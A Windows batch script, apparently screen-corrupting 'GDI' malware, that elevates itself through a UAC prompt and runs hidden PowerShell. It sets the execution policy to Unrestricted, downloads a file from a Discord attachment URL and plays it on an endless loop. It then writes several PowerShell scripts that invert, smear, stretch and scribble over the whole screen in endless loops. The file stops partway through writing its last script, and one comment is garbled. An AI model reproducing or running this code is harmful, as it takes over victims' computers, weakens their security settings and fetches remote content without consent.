@echo off
cls
:: BatchGotAdmin
 :-------------------------------------
 REM  --> Check for permissions
 >nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"

REM --> If error flag set, we do not have admin.
 if '%errorlevel%' NEQ '0' (
     echo Requesting administrative privileges...
     goto UACPrompt
 ) else ( goto gotAdmin )

:UACPrompt
     echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
     echo UAC.ShellExecute "%~s0", "", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
     exit /b

:gotAdmin
     if exist "%temp%\getadmin.vbs" ( del "%temp%\getadmin.vbs" )
     pushd "%CD%"
     CD /D "%~dp0"
 :--------------------------------------
@echo off
cls
powershell -windowstyle hidden -command "Start-Process cmd -WindowStyle Hidden -ArgumentList '/c
PowerShell.exe -NoProfile -Command "Set-ExecutionPolicy Unrestricted -Scope CurrentUser"
mkdir %appdata%\ren
del /s /q %appdata%\ren
cd %appdata%\ren
powershell -Command "Invoke-Webrequest" "https://cdn.discordapp.com/attachments/1049686998044135506/1117030469855363182/8832c52abbccfbdb.wav" -outfile "ILOVE.mp3"
echo Add-Type -AssemblyName PresentationFramework, PresentationCore, WindowsBase                                          >> benben.ps1
echo # 폼 생성                                                                                                               >> benben.ps1
echo $form = New-Object System.Windows.Forms.Form                                                                         >> benben.ps1
echo $form.WindowState = 'Maximized'                                                                                      >> benben.ps1
echo $form.FormBorderStyle = 'None'                                                                                       >> benben.ps1
echo # 폼 배경색을 투명색으로 변경                                                                                                    >> benben.ps1
echo $form.BackColor = 'Transparent'                                                                                      >> benben.ps1
echo # 폼 배경을 투명하게 만듦                                                                                                      >> benben.ps1
echo $form.Opacity = 0                                                                                                    >> benben.ps1
echo # 미디어 플레이어 생성                                                                                                        >> benben.ps1
echo $mediaPlayer = New-Object System.Windows.Media.MediaPlayer                                                           >> benben.ps1
echo $mediaPlayer.Open("$env:appdata\ren\ILOVE.mp3")                                                                     >> benben.ps1
echo $mediaPlayer.Play()                                                                                                  >> benben.ps1
echo # WPF 호스팅을 위한 WindowsFormsHost 컨트롤 생성                                                                                >> benben.ps1
echo $host = New-Object WindowsFormsHost                                                                                  >> benben.ps1
echo $host.Dock = 'Fill'                                                                                                  >> benben.ps1
echo # 미디어 플레이어 컨트롤 생성                                                                                                    >> benben.ps1
echo $mediaElement = New-Object System.Windows.Controls.MediaElement                                                      >> benben.ps1
echo $mediaElement.Source = $mediaPlayer                                                                                  >> benben.ps1
echo $mediaElement.Stretch = 'Uniform'                                                                                    >> benben.ps1
echo # WindowsFormsHost에 미디어 플레이어 컨트롤 추가                                                                                  >> benben.ps1
echo $host.Child = $mediaElement                                                                                          >> benben.ps1
echo # 폼에 WindowsFormsHost 컨트롤 추가                                                                                         >> benben.ps1
echo $form.Controls.Add($host)                                                                                            >> benben.ps1
echo # 폼 실행                                                                                                               >> benben.ps1
echo $null = $form.ShowDialog()                                                                                           >> benben.ps1
echo # PowerShell 창이 꺼지지 않도록 한다                                                                                           >> benben.ps1
echo while ($true) {                                                                                                      >> benben.ps1
echo     # 誘몃뵒???뚮젅?댁뼱媛 醫낅즺?섎㈃ ?ㅼ떆 ?ъ깮?쒕떎                                                                      >> benben.ps1                   
echo     if ($mediaPlayer.Position.TotalMilliseconds -ge $mediaPlayer.NaturalDuration.TimeSpan.TotalMilliseconds) {       >> benben.ps1
echo         $mediaPlayer.Position = [System.TimeSpan]::FromMilliseconds(1)                                               >> benben.ps1
echo         $mediaPlayer.Play()                                                                                          >> benben.ps1
echo     }                                                                                                                >> benben.ps1
echo }                                                                                                                    >> benben.ps1

echo Add-Type -TypeDefinition @^" > 1.ps1
echo using System; >> 1.ps1
echo using System.Runtime.InteropServices; >> 1.ps1
echo public class Program >> 1.ps1
echo { >> 1.ps1 
echo     [DllImport("user32.dll")] >> 1.ps1 
echo     public static extern IntPtr GetDC(IntPtr hWnd); >> 1.ps1 
echo     [DllImport("user32.dll")] >> 1.ps1 
echo     public static extern int ReleaseDC(IntPtr hWnd, IntPtr hDC); >> 1.ps1 
echo     [DllImport("gdi32.dll")] >> 1.ps1 
echo     public static extern bool PatBlt(IntPtr hdc, int nXLeft, int nYLeft, int nWidth, int nHeight, uint dwRop); >> 1.ps1 
echo     [DllImport("user32.dll")] >> 1.ps1 
echo     public static extern int GetSystemMetrics(int nIndex); >> 1.ps1 
echo     public static void Main() >> 1.ps1 
echo     { >> 1.ps1 
echo         IntPtr hdc = GetDC(IntPtr.Zero); >> 1.ps1 
echo         int x = GetSystemMetrics(0); >> 1.ps1 
echo         int y = GetSystemMetrics(1); >> 1.ps1 
echo         while (true) >> 1.ps1 
echo         { >> 1.ps1 
echo             hdc = GetDC(IntPtr.Zero); >> 1.ps1 
echo             PatBlt(hdc, 0, 0, x, y, 0x005A0049); >> 1.ps1 
echo             System.Threading.Thread.Sleep(1); >> 1.ps1 
echo             ReleaseDC(IntPtr.Zero, hdc); >> 1.ps1 
echo         } >> 1.ps1 
echo     } >> 1.ps1 
echo } >> 1.ps1 
echo ^"@ >> 1.ps1 
echo [Program]::Main() >> 1.ps1 


echo Add-Type -TypeDefinition @^" > 3.ps1
echo using System; >> 3.ps1
echo using System.Runtime.InteropServices; >> 3.ps1
echo public class GraphicsHelper >> 3.ps1
echo { >> 3.ps1
echo     [DllImport("user32.dll")] >> 3.ps1
echo     public static extern IntPtr GetDC(IntPtr hwnd); >> 3.ps1
echo     [DllImport("gdi32.dll")] >> 3.ps1
echo     public static extern bool BitBlt(IntPtr hdcDest, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, uint dwRop); >> 3.ps1
echo     [DllImport("user32.dll")] >> 3.ps1
echo     public static extern int GetSystemMetrics(int smIndex); >> 3.ps1
echo     [DllImport("user32.dll")] >> 3.ps1
echo     public static extern int ReleaseDC(IntPtr hwnd, IntPtr hdc); >> 3.ps1
echo     public static void SlideGraphicsEffect() >> 3.ps1
echo     { >> 3.ps1
echo         int screenWidth = GetSystemMetrics(0); >> 3.ps1
echo         int screenHeight = GetSystemMetrics(1); >> 3.ps1
echo         while (true) >> 3.ps1
echo         { >> 3.ps1
echo             IntPtr hdc = GetDC(IntPtr.Zero); >> 3.ps1
echo             BitBlt(hdc, -100, 0, screenWidth, screenHeight, hdc, 0, 0, 0xCC0020); // Use SRCCOPY value (0xCC0020) for normal copy >> 3.ps1
echo             BitBlt(hdc, screenWidth - 100, 0, screenWidth, screenHeight, hdc, 0, 0, 0xCC0020); // Use SRCCOPY value (0xCC0020) for normal copy >> 3.ps1
echo             ReleaseDC(IntPtr.Zero, hdc); >> 3.ps1
echo             System.Threading.Thread.Sleep(10); >> 3.ps1
echo         } >> 3.ps1
echo     } >> 3.ps1
echo } >> 3.ps1
echo ^"@ >> 3.ps1
echo [GraphicsHelper]::SlideGraphicsEffect() >> 3.ps1

echo Add-Type -TypeDefinition @^" > 2b.ps1
echo using System; >> 2b.ps1
echo using System.Runtime.InteropServices; >> 2b.ps1
echo public class GraphicsHelper >> 2b.ps1
echo { >> 2b.ps1
echo     [DllImport("user32.dll")] >> 2b.ps1
echo     public static extern IntPtr GetDC(IntPtr hwnd); >> 2b.ps1
echo     [DllImport("gdi32.dll")] >> 2b.ps1
echo     public static extern IntPtr CreateSolidBrush(uint crColor); >> 2b.ps1
echo     [DllImport("gdi32.dll")] >> 2b.ps1
echo     public static extern IntPtr SelectObject(IntPtr hdc, IntPtr hObject); >> 2b.ps1
echo     [DllImport("gdi32.dll")] >> 2b.ps1
echo     public static extern bool DeleteObject(IntPtr hObject); >> 2b.ps1
echo     [DllImport("gdi32.dll")] >> 2b.ps1
echo     public static extern bool Ellipse(IntPtr hdc, int left, int top, int right, int bottom); >> 2b.ps1
echo     [DllImport("user32.dll")] >> 2b.ps1
echo     public static extern int GetSystemMetrics(int smIndex); >> 2b.ps1
echo     [DllImport("user32.dll")] >> 2b.ps1
echo     public static extern int ReleaseDC(IntPtr hwnd, IntPtr hdc); >> 2b.ps1
echo     public static void RandomEllipseGraphicsEffect() >> 2b.ps1
echo     { >> 2b.ps1
echo         int screenWidth = GetSystemMetrics(0); >> 2b.ps1
echo         int screenHeight = GetSystemMetrics(1); >> 2b.ps1
echo         int signX = 1; >> 2b.ps1
echo         int signY = 1; >> 2b.ps1
echo         int incrementor = 10; >> 2b.ps1
echo         int x = 10; >> 2b.ps1
echo         int y = 10; >> 2b.ps1
echo         while (true) >> 2b.ps1
echo         { >> 2b.ps1
echo             IntPtr hdc = GetDC(IntPtr.Zero); >> 2b.ps1
echo             x += incrementor * signX; >> 2b.ps1
echo             y += incrementor * signY; >> 2b.ps1
echo             int top_x = 0 + x; >> 2b.ps1
echo             int top_y = 0 + y; >> 2b.ps1
echo             int bottom_x = 100 + x; >> 2b.ps1
echo             int bottom_y = 100 + y; >> 2b.ps1
echo             IntPtr brush = CreateSolidBrush((uint)(new Random().Next() %% 0xFFFFFF)); >> 2b.ps1
echo             SelectObject(hdc, brush); >> 2b.ps1
echo             Ellipse(hdc, top_x, top_y, bottom_x, bottom_y); >> 2b.ps1
echo             if ^(y ^>= screenHeight) >> 2b.ps1
echo             { >> 2b.ps1
echo                 signY = -1; >> 2b.ps1
echo             } >> 2b.ps1
echo             if ^(x ^>= screenWidth) >> 2b.ps1
echo             { >> 2b.ps1
echo                 signX = -1; >> 2b.ps1
echo             } >> 2b.ps1
echo             if ^(y == 0) >> 2b.ps1
echo             { >> 2b.ps1
echo                 signY = 1; >> 2b.ps1
echo             } >> 2b.ps1
echo             if ^(x == 0) >> 2b.ps1
echo             { >> 2b.ps1
echo                 signX = 1; >> 2b.ps1
echo             } >> 2b.ps1
echo             DeleteObject(brush); >> 2b.ps1
echo             ReleaseDC(IntPtr.Zero, hdc); >> 2b.ps1
echo             System.Threading.Thread.Sleep(10); >> 2b.ps1
echo         } >> 2b.ps1
echo     } >> 2b.ps1
echo } >> 2b.ps1
echo ^"@ >> 2b.ps1
echo [GraphicsHelper]::RandomEllipseGraphicsEffect() >> 2b.ps1
                                                                                                                        
echo Add-Type -TypeDefinition @^"                                                                                                                                              >> 4.ps1  
echo using System;                                                                                                                                                             >> 4.ps1  
echo using System.Runtime.InteropServices;                                                                                                                                     >> 4.ps1  
echo public class GraphicsHelper                                                                                                                                               >> 4.ps1  
echo {                                                                                                                                                                         >> 4.ps1  
echo     [DllImport("user32.dll")]                                                                                                                                             >> 4.ps1  
echo     public static extern IntPtr GetDC(IntPtr hwnd);                                                                                                                       >> 4.ps1  
echo     [DllImport("gdi32.dll")]                                                                                                                                              >> 4.ps1  
echo     public static extern bool BitBlt(IntPtr hdcDest, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, uint dwRop);                   >> 4.ps1  
echo     [DllImport("user32.dll")]                                                                                                                                             >> 4.ps1  
echo     public static extern int GetSystemMetrics(int smIndex);                                                                                                               >> 4.ps1  
echo     [DllImport("user32.dll")]                                                                                                                                             >> 4.ps1  
echo     public static extern int ReleaseDC(IntPtr hwnd, IntPtr hdc);                                                                                                          >> 4.ps1  
echo     public static void RandomSlideGraphicsEffect()                                                                                                                        >> 4.ps1  
echo     {                                                                                                                                                                     >> 4.ps1  
echo         while (true)                                                                                                                                                      >> 4.ps1  
echo         {                                                                                                                                                                 >> 4.ps1  
echo             IntPtr hdc = GetDC(IntPtr.Zero);                                                                                                                              >> 4.ps1  
echo             int screenWidth = GetSystemMetrics(0);                                                                                                                        >> 4.ps1  
echo             int screenHeight = GetSystemMetrics(1);                                                                                                                       >> 4.ps1  
echo             int randomX = new Random().Next(screenWidth);                                                                                                              >> 4.ps1  
echo             BitBlt(hdc, randomX, 10, 100, screenHeight, hdc, randomX, 0, 0xCC0020);                                                                                       >> 4.ps1  
echo             ReleaseDC(IntPtr.Zero, hdc);                                                                                                                                  >> 4.ps1  
echo         }                                                                                                                                                                 >> 4.ps1  
echo     }                                                                                                                                                                     >> 4.ps1  
echo }                                                                                                                                                                         >> 4.ps1  
echo ^"@                                                                                                                                                                       >> 4.ps1  
echo [GraphicsHelper]::RandomSlideGraphicsEffect()                                                                                                                             >> 4.ps1  

echo Add-Type -TypeDefinition @^"                                                                                                                                              > 5.ps1
echo using System;                                                                                                                                                             >> 5.ps1
echo using System.Runtime.InteropServices;                                                                                                                                     >> 5.ps1
echo public class Program                                                                                                                                                      >> 5.ps1
echo {                                                                                                                                                                         >> 5.ps1
echo     [DllImport("user32.dll")]                                                                                                                                             >> 5.ps1
echo     public static extern IntPtr GetDC(IntPtr hwnd);                                                                                                                       >> 5.ps1
echo     [DllImport("user32.dll")]                                                                                                                                             >> 5.ps1
echo     public static extern int GetSystemMetrics(int smIndex);                                                                                                               >> 5.ps1
echo     [DllImport("user32.dll")]                                                                                                                                             >> 5.ps1
echo     public static extern int ReleaseDC(IntPtr hwnd, IntPtr hdc);                                                                                                          >> 5.ps1
echo     [DllImport("gdi32.dll")]                                                                                                                                              >> 5.ps1
echo     public static extern bool StretchBlt(IntPtr hdcDest, int xDest, int yDest, int wDest, int hDest, IntPtr hdcSrc, int xSrc, int ySrc, int wSrc, int hSrc, int rop);     >> 5.ps1
echo     [DllImport("kernel32.dll")]                                                                                                                                           >> 5.ps1
echo     public static extern void Sleep(uint dwMilliseconds);                                                                                                                 >> 5.ps1
echo     public static void Main()                                                                                                                                             >> 5.ps1
echo     {                                                                                                                                                                     >> 5.ps1
echo         while (true)                                                                                                                                                      >> 5.ps1
echo         {                                                                                                                                                                 >> 5.ps1
echo             IntPtr hdc = GetDC(IntPtr.Zero);                                                                                                                              >> 5.ps1
echo             int x = GetSystemMetrics(0);                                                                                                                                  >> 5.ps1
echo             int y = GetSystemMetrics(1);                                                                                                                                  >> 5.ps1
echo             StretchBlt(hdc, -40, -40, x + 50, y + 50, hdc, 0, 0, x, y, 0x00CC0020);                                                                                       >> 5.ps1
echo             StretchBlt(hdc, 40, 40, x - 50, y - 50, hdc, 0, 0, x, y, 0x00CC0020);                                                                                         >> 5.ps1
echo             ReleaseDC(IntPtr.Zero, hdc);                                                                                                                                  >> 5.ps1
echo             Sleep(10);                                                                                                                                                    >> 5.ps1
echo         }                                                                                                                                                                 >> 5.ps1
echo     }                                                                                                                                                                     >> 5.ps1
echo }                                                                                                                                                                         >> 5.ps1
echo ^"@                                                                                                                                                                       >> 5.ps1
echo [Program]::Main()                                                                                                                                                         >> 5.ps1
echo                                                                                                                                                                           >> 5.ps1

echo Add-Type -TypeDefinition @^"                                                                                                                                                       > 6.ps1
echo using System;                                                                                                                                                                      >> 6.ps1
echo using System.Runtime.InteropServices;                                                                                                                                              >> 6.ps1
echo public class Program                                                                                                                                                               >> 6.ps1
echo {                                                                                                                                                                                  >> 6.ps1
echo     [DllImport("user32.dll")]                                                                                                                                                      >> 6.ps1
echo     public static extern IntPtr GetDC(IntPtr hwnd);                                                                                                                                >> 6.ps1
echo     [DllImport("user32.dll")]                                                                                                                                                      >> 6.ps1
echo     public static extern int GetSystemMetrics(int smIndex);                                                                                                                        >> 6.ps1
echo     [DllImport("user32.dll")]                                                                                                                                                      >> 6.ps1
echo     public static extern int ReleaseDC(IntPtr hwnd, IntPtr hdc);                                                                                                                   >> 6.ps1
echo     [DllImport("gdi32.dll")]                                                                                                                                                       >> 6.ps1
echo     public static extern bool StretchBlt(IntPtr hdcDest, int xDest, int yDest, int wDest, int hDest, IntPtr hdcSrc, int xSrc, int ySrc, int wSrc, int hSrc, int rop);              >> 6.ps1
echo     [DllImport("kernel32.dll")]                                                                                                                                                    >> 6.ps1
echo     public static extern void Sleep(uint dwMilliseconds);                                                                                                                          >> 6.ps1
echo     public static void Main()                                                                                                                                                      >> 6.ps1
echo     {                                                                                                                                                                              >> 6.ps1
echo         while (true)                                                                                                                                                               >> 6.ps1
echo         {                                                                                                                                                                          >> 6.ps1
echo             IntPtr hdc = GetDC(IntPtr.Zero);                                                                                                                                       >> 6.ps1
echo             int x = GetSystemMetrics(0);                                                                                                                                           >> 6.ps1
echo             int y = GetSystemMetrics(1);                                                                                                                                           >> 6.ps1
echo             StretchBlt(hdc, -20, -20, x + 30, y + 30, hdc, 0, 0, x, y, 0x00CC0020);                                                                                                >> 6.ps1
echo             StretchBlt(hdc, 20, 20, x - 30, y - 30, hdc, 0, 0, x, y, 0x00CC0020);                                                                                                  >> 6.ps1
echo             ReleaseDC(IntPtr.Zero, hdc);                                                                                                                                           >> 6.ps1
echo             Sleep(1);                                                                                                                                                              >> 6.ps1
echo         }                                                                                                                                                                          >> 6.ps1
echo     }                                                                                                                                                                              >> 6.ps1
echo }                                                                                                                                                                                  >> 6.ps1
echo ^"@                                                                                                                                                                                >> 6.ps1
echo [Program]::Main()                                                                                                                                                                  >> 6.ps1

echo Add-Type -TypeDefinition @^"                                                                                                                                                                    > 6l.ps1                                                                                                                               
echo using System;                                                                                                                                                                                   >> 6l.ps1   
echo using System.Runtime.InteropServices;                                                                                                                                                            >> 6l.ps1   
echo public class Program                                                                                                                                                                           >> 6l.ps1   
echo {                                                                                                                                                                                             >> 6l.ps1   
echo     [DllImport("user32.dll")]                                                                                                                                                                     >> 6l.ps1   
echo     public static extern IntPtr GetDC(IntPtr hwnd);                                                                                                                                            >> 6l.ps1   
echo     [DllImport("user32.dll")]                                                                                                                                                                    >> 6l.ps1   
echo     public static extern int GetSystemMetrics(int smIndex);                                                                                                                                      >> 6l.ps1   
echo     [DllImport("user32.dll")]                                                                                                                                                                   >> 6l.ps1   
echo     public static extern int ReleaseDC(IntPtr hwnd, IntPtr hdc);                                                                                                                                >> 6l.ps1   
echo     [DllImport("gdi32.dll")]                                                                                                                                                                    >> 6l.ps1   
echo     public static extern bool StretchBlt(IntPtr hdcDest, int xDest, int yDest, int wDest, int hDest, IntPtr hdcSrc, int xSrc, int ySrc, int wSrc, int hSrc, int rop);                          >> 6l.ps1   
echo     [DllImport("kernel32.dll")]                                                                                                                                                                  >> 6l.ps1   
echo     public static extern void Sleep(uint dwMilliseconds);                                                                                                                                        >> 6l.ps1   
echo     public static void Main()                                                                                                                                                                   >> 6l.ps1   
echo     {                                                                                                                                                                                           >> 6l.ps1   
echo         while (true)                                                                                                                                                                            >> 6l.ps1   
echo         {                                                                                                                                                                                    >> 6l.ps1   
echo             IntPtr hdc = GetDC(IntPtr.Zero);                                                                                                                                                >> 6l.ps1   
echo             int x = GetSystemMetrics(0);                                                                                                                                                        >> 6l.ps1   
echo             int y = GetSystemMetrics(1);                                                                                                                                                     >> 6l.ps1   
echo             StretchBlt(hdc, -2000, -2000, x + 3000, y + 9044, hdc, 0, 0, x, y, 0x00CC0020);                                                                                                     >> 6l.ps1   
echo             StretchBlt(hdc, 20, 20, x - 30, y - 1, hdc, 0, 0, x, y, 0x00CC0020);                                                                                                              >> 6l.ps1   
echo             ReleaseDC(IntPtr.Zero, hdc);                                                                                                                                                                   >> 6l.ps1                                                                                                                                 
echo         }                                                                                                                                                                                       >> 6l.ps1   
echo     }                                                                                                                                                                                            >> 6l.ps1   
echo }                                                                                                                                                                                               >> 6l.ps1   
echo ^"@                                                                                                                                                                                             >> 6l.ps1   
echo [Program]::Main()                                                                                                                                                                            >> 6l.ps1   

echo Add-Type -TypeDefinition @^"                                                                                                                                              > 7.ps1       
echo using System;                                                                                                                                                            >> 7.ps1
echo using System.Runtime.InteropServices;                                                                                                                                    >> 7.ps1
echo public class Program                                                                                                                                                     >> 7.ps1
echo {                                                                                                                                                                        >> 7.ps1
echo     [DllImport("user32.dll")]                                                                                                                                            >> 7.ps1
echo     public static extern IntPtr GetDC(IntPtr hwnd);                                                                                                                      >> 7.ps1
echo     [DllImport("user32.dll")]                                                                                                                                            >> 7.ps1
echo     public static extern int GetSystemMetrics(int smIndex);                                                                                                              >> 7.ps1
echo     [DllImport("user32.dll")]                                                                                                                                            >> 7.ps1
echo     public static extern int ReleaseDC(IntPtr hwnd, IntPtr hdc);                                                                                                         >> 7.ps1
echo     [DllImport("gdi32.dll")]                                                                                                                                             >> 7.ps1
echo     public static extern IntPtr CreateSolidBrush(int color);                                                                                                             >> 7.ps1
echo     [DllImport("gdi32.dll")]                                                                                                                                             >> 7.ps1
echo     public static extern IntPtr SelectObject(IntPtr hdc, IntPtr hObject);                                                                                                >> 7.ps1
echo     [DllImport("gdi32.dll")]                                                                                                                                             >> 7.ps1
echo     public static extern bool Pie(IntPtr hdc, int left, int top, int right, int bottom, int xr1, int yr1, int xr2, int yr2);                                             >> 7.ps1
echo     [DllImport("gdi32.dll")]                                                                                                                                             >> 7.ps1
echo     public static extern bool DeleteObject(IntPtr hObject);                                                                                                              >> 7.ps1
echo     [DllImport("kernel32.dll")]                                                                                                                                          >> 7.ps1
echo     public static extern void Sleep(uint dwMilliseconds);                                                                                                                >> 7.ps1
echo     public static void Main()                                                                                                                                            >> 7.ps1
echo     {                                                                                                                                                                    >> 7.ps1
echo         Random random = new Random();                                                                                                                                    >> 7.ps1
echo         while (true)                                                                                                                                                     >> 7.ps1
echo         {                                                                                                                                                                >> 7.ps1
echo             IntPtr hdc = GetDC(IntPtr.Zero);                                                                                                                             >> 7.ps1
echo             int x = GetSystemMetrics(0);                                                                                                                                 >> 7.ps1
echo             int y = GetSystemMetrics(1);                                                                                                                                 >> 7.ps1
echo             IntPtr brush = CreateSolidBrush((random.Next(255) ^<^< 16) ^| (random.Next(255) ^<^< 8) ^| random.Next(255));                                                >> 7.ps1
echo             SelectObject(hdc, brush);                                                                                                                                    >> 7.ps1
echo             Pie(hdc, random.Next(x), random.Next(y), random.Next(x), random.Next(y), random.Next(x), random.Next(y), random.Next(x), random.Next(y));                    >> 7.ps1
echo             DeleteObject(brush);                                                                                                                                         >> 7.ps1
echo             ReleaseDC(IntPtr.Zero, hdc);                                                                                                                                 >> 7.ps1
echo             Sleep(100);                                                                                                                                                  >> 7.ps1
echo         }                                                                                                                                                                >> 7.ps1
echo     }                                                                                                                                                                    >> 7.ps1
echo }                                                                                                                                                                        >> 7.ps1
echo ^"@                                                                                                                                                                      >> 7.ps1
echo [Program]::Main()                                                                                                                                                        >> 7.ps1

echo Add-Type -TypeDefinition @^"                                                                                                                                              > 7l.ps1       
echo using System;                                                                                                                                                            >> 7l.ps1
echo using System.Runtime.InteropServices;                                                                                                                                    >> 7l.ps1
echo public class Program                                                                                                                                                     >> 7l.ps1
echo {                                                                                                                                                                        >> 7l.ps1
echo     [DllImport("user32.dll")]                                                                                                                                            >> 7l.ps1
echo     public static extern IntPtr GetDC(IntPtr hwnd);                                                                                                                      >> 7l.ps1
echo     [DllImport("user32.dll")]                                                                                                                                            >> 7l.ps1
echo     public static extern int GetSystemMetrics(int smIndex);                                                                                                              >> 7l.ps1
echo     [DllImport("user32.dll")]                                                                                                                                            >> 7l.ps1
echo     public static extern int ReleaseDC(IntPtr hwnd, IntPtr hdc);                                                                                                         >> 7l.ps1
echo     [DllImport("gdi32.dll")]                                                                                                                                             >> 7l.ps1
echo     public static extern IntPtr CreateSolidBrush(int color);                                                                                                             >> 7l.ps1
echo     [DllImport("gdi32.dll")]                                                                                                                                             >> 7l.ps1
echo     public static extern IntPtr SelectObject(IntPtr hdc, IntPtr hObject);                                                                                                >> 7l.ps1
echo     [DllImport("gdi32.dll")]                                                                                                                                             >> 7l.ps1
echo     public static extern bool Pie(IntPtr hdc, int left, int top, int right, int bottom, int xr1, int yr1, int xr2, int yr2);                                             >> 7l.ps1
echo     [DllImport("gdi32.dll")]                                                                                                                                             >> 7l.ps1
echo     public static extern bool DeleteObject(IntPtr hObject);                                                                                                              >> 7l.ps1
echo     [DllImport("kernel32.dll")]                                                                                                                                          >> 7l.ps1
echo     public static extern void Sleep(uint dwMilliseconds);                                                                                                                >> 7l.ps1
echo     public static void Main()                                                                                                                                            >> 7l.ps1
echo     {                                                                                                                                                                    >> 7l.ps1
echo         Random random = new Random();                                                                                                                                    >> 7l.ps1
echo         while (true)                                                                                                                                                     >> 7l.ps1
echo         {                                                                                                                                                                >> 7l.ps1
echo             IntPtr hdc = GetDC(IntPtr.Zero);                                                                                                                             >> 7l.ps1
echo             int x = GetSystemMetrics(0);                                                                                                                                 >> 7l.ps1
echo             int y = GetSystemMetrics(1);                                                                                                                                 >> 7l.ps1
echo             IntPtr brush = CreateSolidBrush((random.Next(255) ^<^< 16) ^| (random.Next(255) ^<^< 8) ^| random.Next(255));                                                >> 7l.ps1
echo             SelectObject(hdc, brush);                                                                                                                                    >> 7l.ps1
echo             Pie(hdc, random.Next(x), random.Next(y), random.Next(x), random.Next(y), random.Next(x), random.Next(y), random.Next(x), random.Next(y));                    >> 7l.ps1
echo             DeleteObject(brush);                                                                                                                                         >> 7l.ps1
echo             ReleaseDC(IntPtr.Zero, hdc);                                                                                                                                 >> 7l.ps1
echo         }                                                                                                                                                                >> 7l.ps1
echo     }                                                                                                                                                                    >> 7l.ps1
echo }                                                                                                                                                                        >> 7l.ps1
echo ^"@                                                                                                                                                                      >> 7l.ps1
echo [Program]::Main()                                                                                                                                                        >> 7l.ps1

echo Add-Type -TypeDefinition @^"                                                                                                                                        > 8.ps1
echo using System;                                                                                                                                                       >> 8.ps1
echo using System.Runtime.InteropServices;                                                                                                                               >> 8.ps1
echo public class GraphicsHelper2                                                                                                                                        >> 8.ps1
echo {                                                                                                                                                                   >> 8.ps1
echo     [DllImport("user32.dll")]                                                                                                                                       >> 8.ps1
echo     private static extern IntPtr GetDC(IntPtr hwnd);                                                                                                                >> 8.ps1
echo     [DllImport("user32.dll")]                                                                                                                                       >> 8.ps1
echo     private static extern int ReleaseDC(IntPtr hwnd, IntPtr hdc);                                                                                                   >> 8.ps1
echo     [DllImport("gdi32.dll")]                                                                                                                                        >> 8.ps1
echo     private static extern bool BitBlt(IntPtr hdcDest, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, int dwRop);             >> 8.ps1
echo     public static void ScrollGraphicsDown()                                                                                                                         >> 8.ps1
echo     {                                                                                                                                                               >> 8.ps1
echo         IntPtr desktopPtr = GetDC(IntPtr.Zero);                                                                                                                     >> 8.ps1
echo         IntPtr destDC = CreateCompatibleDC(desktopPtr);                                                                                                             >> 8.ps1
echo         int screenWidth = GetSystemMetrics(0);                                                                                                                      >> 8.ps1
echo         int screenHeight = GetSystemMetrics(1);                                                                                                                     >> 8.ps1
echo         IntPtr hBitmap = IntPtr.Zero;                                                                                                                               >> 8.ps1
echo         IntPtr hOldBitmap = IntPtr.Zero;                                                                                                                            >> 8.ps1
echo         try                                                                                                                                                         >> 8.ps1
echo         {                                                                                                                                                           >> 8.ps1
echo             hBitmap = CreateCompatibleBitmap(desktopPtr, screenWidth, screenHeight);                                                                                >> 8.ps1
echo             hOldBitmap = SelectObject(destDC, hBitmap);                                                                                                             >> 8.ps1
echo             int scrollAmount = 4;                                                                                                                                   >> 8.ps1
echo             while (true)                                                                                                                                            >> 8.ps1
echo             {                                                                                                                                                       >> 8.ps1
echo                 BitBlt(destDC, 0, 0, screenWidth, screenHeight - scrollAmount, desktopPtr, 0, scrollAmount, 0x00CC0020);                                            >> 8.ps1
echo                 BitBlt(desktopPtr, 0, 0, screenWidth, screenHeight, destDC, 0, 0, 0x00CC0020);                                                                      >> 8.ps1
echo             }                                                                                                                                                       >> 8.ps1
echo         }                                                                                                                                                           >> 8.ps1
echo         finally                                                                                                                                                     >> 8.ps1
echo         {                                                                                                                                                           >> 8.ps1
echo             if (hOldBitmap ^!= IntPtr.Zero)                                                                                                                         >> 8.ps1
echo                 SelectObject(destDC, hOldBitmap);                                                                                                                   >> 8.ps1
echo             if (hBitmap ^!= IntPtr.Zero)                                                                                                                            >> 8.ps1
echo                 DeleteObject(hBitmap);                                                                                                                              >> 8.ps1
echo             ReleaseDC(IntPtr.Zero, desktopPtr);                                                                                                                     >> 8.ps1
echo             ReleaseDC(IntPtr.Zero, destDC);                                                                                                                         >> 8.ps1
echo         }                                                                                                                                                           >> 8.ps1
echo     }                                                                                                                                                               >> 8.ps1
echo     [DllImport("gdi32.dll")]                                                                                                                                        >> 8.ps1
echo     private static extern IntPtr CreateCompatibleBitmap(IntPtr hdc, int nWidth, int nHeight);                                                                       >> 8.ps1
echo     [DllImport("gdi32.dll")]                                                                                                                                        >> 8.ps1
echo     private static extern IntPtr CreateCompatibleDC(IntPtr hdc);                                                                                                    >> 8.ps1
echo     [DllImport("gdi32.dll")]                                                                                                                                        >> 8.ps1
echo     private static extern IntPtr SelectObject(IntPtr hdc, IntPtr hgdiobj);                                                                                          >> 8.ps1
echo     [DllImport("gdi32.dll")]                                                                                                                                        >> 8.ps1
echo     private static extern bool DeleteObject(IntPtr hObject);                                                                                                        >> 8.ps1
echo     [DllImport("user32.dll")]                                                                                                                                       >> 8.ps1
echo     private static extern int GetSystemMetrics(int nIndex);                                                                                                         >> 8.ps1
echo }                                                                                                                                                                   >> 8.ps1
echo ^"@                                                                                                                                                                 >> 8.ps1
echo [GraphicsHelper2]::ScrollGraphicsDown()                                                                                                                             >> 8.ps1
echo                                                                                                                                                                     >> 8.ps1


echo Add-Type -TypeDefinition @^"                                                                                                                                                             > 9.ps1
echo using System;                                                                                                                                                                            >> 9.ps1
echo using System.Drawing;                                                                                                                                                                    >> 9.ps1
echo using System.Runtime.InteropServices;                                                                                                                                                    >> 9.ps1
echo using System.Threading;                                                                                                                                                                  >> 9.ps1
echo public class GraphicsHelper                                                                                                                                                              >> 9.ps1
echo {                                                                                                                                                                                        >> 9.ps1
echo     [DllImport("user32.dll")]                                                                                                                                                            >> 9.ps1
echo     public static extern IntPtr GetDC(IntPtr hWnd);                                                                                                                                      >> 9.ps1
